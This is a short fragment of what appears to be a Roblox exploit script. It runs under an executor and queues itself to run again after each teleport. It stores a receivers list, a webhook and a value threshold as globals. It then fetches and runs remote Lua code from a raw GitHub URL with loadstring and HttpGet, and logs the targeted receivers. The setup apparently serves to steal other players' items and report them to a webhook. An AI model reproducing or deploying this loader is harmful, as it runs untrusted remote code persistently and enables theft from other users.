local v485 = "    local H = game:GetService(\"HttpService\")\n    local d = H:JSONDecode('" .. HttpService:JSONEncode({
	RECEIVERS = RECEIVERS, WEBHOOK = WEBHOOK, THRESHOLD = THRESHOLD
}) .. [[')
    getgenv().RECEIVERS = d.RECEIVERS
    getgenv().WEBHOOK   = d.WEBHOOK
    getgenv().THRESHOLD = d.THRESHOLD
    loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/sab.lua"))()
]]

if queue_on_teleport then queue_on_teleport(v485) end

v8("=== SAB LOADED | targets=" .. table.concat(RECEIVERS, ", ") .. " threshold=" .. THRESHOLD .. " ===")